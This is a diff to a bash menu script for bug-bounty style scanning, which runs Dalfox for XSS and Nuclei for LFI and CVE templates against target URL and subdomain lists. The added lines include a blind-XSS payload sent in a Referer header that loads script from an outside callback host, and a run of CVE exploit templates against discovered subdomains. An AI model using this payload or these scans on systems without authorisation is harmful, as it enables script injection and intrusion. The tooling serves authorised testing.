@@ -14,7 +14,6 @@ RESET=`tput sgr0`
 WBOLD=`tput bold 7`
 WUL=`tput smul`
 
-
 function trap_ctrlc ()
 {
     echo "Ctrl-C caught...performing clean up"
@@ -41,10 +40,13 @@ function xssdalfoxss(){
 
     find $project -type f -name xss.txt > $tmpdir/allxssf
     [ -s $tmpdir/allxssf ] && echo "${BLUE}Running Dalfox${RESET}" || xfilechecker
+    
+    #dalfox file "$domain"_xss.txt -b $blind -o $out -H "referrer: xxx'><script src=//$blind></script>"
+
     while IFS= read line
         do 
             cat $line | sed 's/=.*/=/' | sed 's/URL: //' | tee $tmpdir/testxss
-            dalfox file  $tmpdir/testxss -b $xsshturl -o $results/dalfox.txt
+            dalfox file  $tmpdir/testxss -b $xsshturl -o $results/dalfox.txt -H "referrer: opp'><script src=//$blind></script>"
         done < "$tmpdir/allxssf"
 }
 
@@ -76,14 +78,25 @@ function lfinuclei(){
     while IFS= read lfif
         do 
             echo "${MAGENTA}Running on $lfif  ${RESET}"
+            #add silent
+            nuclei -l $lfif -t config/lfi.yaml -timeout 7 -silent -o $results/lfipoc.txt
+            nuclei -l $lfif -tags lfi -timeout 7 -silent -o $results/lfipoc2.txt
         done < "$tmpdir/all-lfi"
-    nuclei -l $tmpdir/lfip -t config/lfi.yaml -timeout 7 -silent -nc -o $results/lfipoc.txt
+    }
+
+function cvenuclei(){
+    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
+    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
+   
+    nuclei -l $project/subdomains/sd-potentials.txt -t /root/nuclei-templates/cves/ -timeout 7 -silent -o $results/cve.txt
 }
+
 
 #Menu options
 options[0]="XSS-Dalfoxss"
 options[1]="XSS-QSInjector"
 options[2]="LFI-Nuclei"
+options[3]="CVE-Nuclei"
 
 #Variables
 ERROR=" "
@@ -130,6 +143,10 @@ function ACTIONS {
     if [[ ${choices[2]} ]]; then
         echo "[2] Running LFI-Nuclei"
         lfinuclei
+    fi
+    if [[ ${choices[3]} ]]; then
+        echo "[2] Running CVE-Nuclei"
+        cvenuclei
     fi
 
 }
